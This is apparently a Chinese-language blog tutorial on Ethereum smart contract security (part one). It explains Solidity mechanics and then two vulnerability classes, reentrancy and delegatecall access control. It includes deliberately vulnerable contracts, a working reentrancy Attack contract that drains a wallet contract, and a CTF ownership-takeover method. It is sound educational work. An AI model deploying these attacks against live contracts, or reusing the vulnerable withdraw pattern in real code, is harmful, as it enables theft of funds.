---
layout: post
title: 以太坊智能合约安全入门了解一下（上）
tags: [ethereum, blockchain, security]
---

**（注：本文分上/下两部分完成）**

最近区块链漏洞不要太火，什么交易所用户被钓鱼导致 APIKEY 泄漏，代币合约出现整数溢出漏洞致使代币归零， MyEtherWallet 遭 DNS 劫持致使用户 ETH 被盗等等。频频爆出的区块链安全事件，越来越多的安全从业者将目标转到了 Blockchain 上。经过一段时间的恶补，让我从以太坊智能合约 “青铜I段” 升到了 “青铜III段”，本文将从以太坊智能合约的一些特殊机制说起，详细地剖析已发现各种漏洞类型，对每一种漏洞类型都会提供一段简单的合约代码来对漏洞成因和攻击方法进行说明。

在阅读接下来的文章内容之前，我假定你已经对以太坊智能合约的相关概念已经有了一定的了解。如果从开发者的角度来看智能，大概是这个样子：

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/1.png)

以太坊专门提供了一种叫 EVM 的虚拟机供合约代码运行，同时也提供了面向合约的语言来加快开发者开发合约，像官方推荐且用的最多的 Solidity 是一种语法类似 JavaScript 的合约开发语言。开发者按一定的业务逻辑编写合约代码，并将其部署到以太坊上，代码根据业务逻辑将数据记录在链上。以太坊其实就是一个应用生态平台，借助智能合约我们可以开发出各式各样的应用发布到以太坊上供业务直接使用。关于以太坊/智能合约的概念可参考[文档](http://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html)。

接下来也是以 Solidity 为例来说明以太坊智能合约的一些已存在安全问题。

### I. 智能合约开发 - Solidity

Solidity 的语法类似 JavaSript，整体还是比较好上手，一个简单的用 Solidity 编写的合约代码如下

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/2.png)

语法相关的话我建议可以先看一下这个[教学系列](https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR)（FQ），下面我说说我在学习和复习以太坊智能合约时一开始比较懵逼的地方：

#### 1. 以太坊账户和智能合约区别

以太坊账户分两种，外部账户和合约账户。外部账户由一对公私钥进行管理，账户包含着 Ether 的余额，而合约账户除了可以含有 Ether 余额外，还拥有一段特定的代码，预先设定代码逻辑在外部账户或其他合约对其合约地址发送消息或发生交易时被调用和处理：

**外部账户 EOA**

- 由公私钥对控制
- 拥有 ether 余额
- 可以发送交易（transactions）
- 不包含相关执行代码

**合约账户**

- 拥有 ether 余额
- 含有执行代码
- 代码仅在该合约地址发生交易或者收到其他合约发送的信息时才会被执行
- 拥有自己的独立存储状态，且可以调用其他合约

（这里留一个问题：“合约账户也有公私钥对吗？若有，那么允许直接用公私钥对控制账户以太坊余额吗？”）

简单来说就是合约账户由外部账户或合约代码逻辑进行创建，一旦部署成功，只能按照预先写好的合约逻辑进行业务交互，不存在其他方式直接操作合约账户或更改已部署的合约代码。

#### 2. 代码执行限制

在初识 Solidity 时需要注意的一些代码执行限制：

以太坊在设置时为了防止合约代码出现像 “死循环” 这样的情况，添加了代码执行消耗这一概念。合约代码部署到以太坊平台后，EVM 在执行这些代码时，每一步执行都会消耗一定 Gas，Gas 可以被看作是能量，一段代码逻辑可以假设为一套 “组合技”，而外部调用者在调用该合约的某一函数时会提供数量一定的 Gas，如果这些 Gas 大于这一套 “组合技” 所需的能量，则会成功执行，否则会由于 Gas 不足而发生 `out of gas` 的异常，合约状态回滚。

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/4.png)

同时在 Solidity 中，函数中递归调用栈（深度）不能超过 1024 层：

```javascript
contract Some {
    function Loop() {
        Loop();
    }
}

// Loop() ->
//  Loop() ->
//    Loop() ->
//      ...
//      ... (must less than 1024)
//      ...
//        Loop()
```

#### 3. 回退函数 - fallback()

在跟进 Solidity 的安全漏洞时，有很大一部分都与合约实例的回退函数有关。那什么是回退函数呢？官方文档描述到：

> A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).

fallback 函数在合约实例中表现形式即为一个不带参数没有返回值的匿名函数：

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/3.png)

那么什么时候会执行 fallback 函数呢？

1. 当外部账户或其他合约向该合约地址发送 ether 时；
2. 当外部账户或其他合约调用了该合约一个**不存在**的函数时；

**注：目前已知的关于 Solidity 的安全问题大多都会涉及到 fallback 函数**

#### 4. 几种转币方法对比

Solidity 中 `<address>.transfer()`，`<address>.send()` 和 `<address>.gas().call.vale()()` 都可以用于向某一地址发送 ether，他们的区别在于：

**<address\>.transfer()**

- 当发送失败时会 `throw;` 回滚状态
- 只会传递 2300 Gas 供调用，防止重入（reentrancy）

**<address\>.send()**

- 当发送失败时会返回 `false` 布尔值
- 只会传递 2300 Gas 供调用，防止重入（reentrancy）

**<address\>.gas().call.value()()**

- 当发送失败时会返回 `false` 布尔值
- 传递所有可用 Gas 进行调用（可通过 `gas(gas_value)` 进行限制），不能有效防止重入（reentrancy）

**注：开发者需要根据不同场景合理的使用这些函数来实现转币的功能，如果考虑不周或处理不完整，则极有可能出现漏洞被攻击者利用**

例如，早期很多合约在使用 `<address>.send()` 进行转帐时，都会忽略掉其返回值，从而致使当转账失败时，后续的代码流程依然会得到执行。

#### 5. require 和 assert，revert 与 throw

`require` 和 `assert` 都可用于检查条件，并在不满足条件的时候抛出异常，但在使用上 `require` 更偏向代码逻辑健壮性检查上；而在需要确认一些本不该出现的情况异常发生的时候，就需要使用 `assert` 去判断了。

`revert` 和 `throw` 都是标记错误并恢复当前调用，但 Solidity 在 `0.4.10` 开始引入 `revert()`, `assert()`, `require()` 函数，用法上原先的 `throw;` 等于 `revert()`。

关于这几个函数详细讲解，可以参考[文章](https://medium.com/blockchannel/the-use-of-revert-assert-and-require-in-solidity-and-the-new-revert-opcode-in-the-evm-1a3a7990e06e)。

### II. 漏洞现场还原

历史上已经出现过很多关于以太坊合约的安全事件，这些安全事件在当时的影响也是巨大的，轻则让已部署的合约无法继续运行，重则会导致数千万美元的损失。在金融领域，是不允许错误出现的，但从侧面来讲，正是这些安全事件的出现，才促使了以太坊或者说是区块链安全的发展，越来越多的人关注区块链安全、合约安全、协议安全等。

所以，通过一段时间的学习，在这我将已经明白的关于以太坊合约的几个漏洞原理记录下来，有兴趣的可以进一步交流。

下面列出了已知的常见的 Solidity 的漏洞类型（来自于 [DASP Top 10](https://www.dasp.co/)）：

1. Reentrancy - 重入
2. Access Control - 访问控制
3. Arithmetic Issues - 算术问题（整数上下溢出）
4. Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值
5. Denial of Service - 拒绝服务
6. Bad Randomness - 可预测的随机处理
7. Front Running
8. Time manipulation
9. Short Address Attack - 短地址攻击
10. Unknown Unknowns - 其他未知

下面我会按照 `原理` -> `示例（代码）` -> `攻击` 来对每一类型的漏洞进行原理说明和攻击方法的讲解。

#### 1. Reentrancy

重入漏洞，在我刚开始看这个漏洞类型的时候，还是比较懵逼的，因为从字面上来看，“重入” 其实可以简单理解成 “递归” 的意思，那么在传统的开发语言里 “递归” 调用是一种很常见的逻辑处理方式，那在 Solidity 里为什么就成了漏洞了呢。在上面一部分也有讲到，在以太坊智能合约里有一些内在的执行限制，如 Gas Limit，来看下面这段代码：

```javascript
pragma solidity ^0.4.10;

contract IDMoney {
    address owner;
    mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况

    event withdrawLog(address, uint256);
    
    function IDMoney() { owner = msg.sender; }
    function deposit() payable { balances[msg.sender] += msg.value; }
    function withdraw(address to, uint256 amount) {
        require(balances[msg.sender] > amount);
        require(this.balance > amount);

        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
        
        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
        balances[msg.sender] -= amount;
    }
    function balanceOf() returns (uint256) { return balances[msg.sender]; }
    function balanceOf(address addr) returns (uint256) { return balances[addr]; }
}
```

这段代码是为了说明重入漏洞原理编写的，实现的是一个类似公共钱包的合约。任何人都可以向 `IDMoney` 存入相应的 Ether，合约会记录每个账户在该合约里的资产（Ether）情况，账户可以查询自身/他人在此合约中的余额，同时也能够通过 `withdraw` 将自己在合约中的 Ether 直接提取出来转给其他账户。

初识以太坊智能合约的人在分析上面这段代码时，应该会认为是一段比较正常的代码逻辑，似乎并没有什么问题。但是我在之前就说了，以太坊智能合约漏洞的出现其实跟自身的语法（语言）特性有很大的关系。这里，我们把焦点放在 `withdraw(address, uint256)` 函数中，合约在进行提币时，使用 `require` 依次判断提币账户是否拥有相应的资产和该合约是否拥有足够的资金可供提币（有点类似于交易所的提币判断），随后使用 `to.call.value(amount)();` 来发送 Ether，处理完成后相应修改用户资产数据。

仔细看过第一部分 I.3 的同学肯定发现了，这里转币的方法用的是 `call.value()()` 的方式，区别于 `send()` 和 `transfer()` 两个相似功能的函数，`call.value()()` 会将剩余的 Gas 全部给予外部调用（fallback 函数），而 `send()` 和 `transfer()` 只会有 `2300` 的 Gas 量来处理本次转币操作。如果在进行 Ether 交易时目标地址是个合约地址，那么默认会调用该合约的 fallback 函数（存在的情况下，不存在转币会失败，注意 payable 修饰）。

上面说了这么多，显然地，在提币或者说是合约用户在转币的过程中，存在一个递归 `withdraw` 的问题（因为资产修改在转币之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether 全部提出，流程大致是这样的：

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/6.png)

**（读者可以直接先根据上面的 `IDMoney` 合约代码写出自己的攻击合约代码，然后在测试环境中进行模拟）**

我实现的攻击合约代码如下：

```javascript
contract Attack {
    address owner;
    address victim;

    modifier ownerOnly { require(owner == msg.sender); _; }
    
    function Attack() payable { owner = msg.sender; }
    
    // 设置已部署的 IDMoney 合约实例地址
    function setVictim(address target) ownerOnly { victim = target; }
    
    // deposit Ether to IDMoney deployed
    function step1(uint256 amount) ownerOnly payable {
        if (this.balance > amount) {
            victim.call.value(amount)(bytes4(keccak256("deposit()")));
        }
    }
    // withdraw Ether from IDMoney deployed
    function step2(uint256 amount) ownerOnly {
        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
    }
    // selfdestruct, send all balance to owner
    function stopAttack() ownerOnly {
        selfdestruct(owner);
    }

    function startAttack(uint256 amount) ownerOnly {
        step1(amount);
        step2(amount / 2);
    }

    function () payable {
        if (msg.sender == victim) {
            // 再次尝试调用 IDCoin 的 sendCoin 函数，递归转币
            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
        }
    }
}
```

使用 `remix-ide` 模拟攻击流程：

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/reentrancy_demo.gif)

著名导致以太坊硬分叉（ETH/ETC）的 [The DAO](https://blog.slock.it/the-history-of-the-dao-and-lessons-learned-d06740f8cfa5) 事件就跟重入漏洞有关，该事件导致 60 多万以太坊被盗。

#### 2. Access Control

访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：`private`, `public`, `external` 和 `internal`，对合约实例方法来讲，默认可见状态为 `public`，而合约实例变量的默认可见状态为 `private`。

- public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数
- external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 `this.func()` 外部调用的方式调用该函数
- private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）
- internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）

Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 `call` 和 `delegatecall`：

- `call` 的外部调用上下文是外部合约
- `delegatecall` 的外部调用上下是调用合约上下文

简单的用图表示就是：

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/7.png)

合约 A 以 `call` 方式调用外部合约 B 的 `func()` 函数，在外部合约 B 上下文执行完 `func()` 后继续返回 A 合约上下文继续执行；而当 A 以 `delegatecall` 方式调用时，相当于将外部合约 B 的 `func()` 代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。

下面代码是 OpenZeppelin CTF 中的题目：

```javascript
pragma solidity ^0.4.10;

contract Delegate {
    address public owner;

    function Delegate(address _owner) {
        owner = _owner;
    }
    function pwn() {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    function Delegation(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }
    function () {
        if (delegate.delegatecall(msg.data)) {
            this;
        }
    }
}
```

仔细分析代码，合约 Delegation 在 fallback 函数中使用 `msg.data` 对 Delegate 实例进行了 `delegatecall()` 调用。`msg.data` 可控，这里攻击者直接用 `bytes4(keccak256("pwn()"))` 即可通过 `delegatecall()` 将已部署的 Delegation `owner` 修改为攻击者自己（msg.sender）。

使用 `remix-ide` 模拟攻击流程：

![](/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilites-review/delegatecall_demo.gif)

2017 年下半年出现的智能合约钱包 Parity 被盗事件就跟未授权和 `delegatecall` 有关。

**（注：本文上部主要讲解了以太坊智能合约安全的研究基础和两类漏洞原理实例，在《以太坊智能合约安全入门了解一下（下）》中会补全其他几类漏洞的原理讲解，并有一小节 “自我思考” 来总结我在学习和研究以太坊智能合约安全时遇到的细节问题）**

### 参考链接：

- [http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function)
- [https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue](https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue)
- [http://www.cryptologie.net/](http://www.cryptologie.net/)
- [https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send](https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send)
- [https://www.dasp.co/](https://www.dasp.co/)
- [https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR](https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR)